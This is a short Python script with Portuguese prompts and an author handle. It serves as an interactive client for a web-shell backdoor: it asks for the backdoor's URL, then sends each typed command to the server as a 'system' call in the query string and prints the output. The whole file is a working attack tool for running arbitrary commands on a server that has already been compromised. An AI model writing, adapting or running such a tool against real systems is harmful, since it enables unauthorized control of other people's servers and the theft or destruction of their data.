#!/bin/python

import os
import requests

BLUE = '\033[94m'
ENDC = '\033[0m'


print("Script by @wh0001s")
url = input("URL: ")

if url == "":
    print("Informe a URL com a backdoor.")
else:
    print("\nInforme o cmd para ser executado no backdoor.")
    while 1==1:
        cmd = input("cmd: ")
        os.system("cls || clear")
        print("Comando sendo executado: " + cmd) 
        res = requests.get(url + "?0=system&V1=" + cmd)
        print("\n"+BLUE+res.text+ENDC)
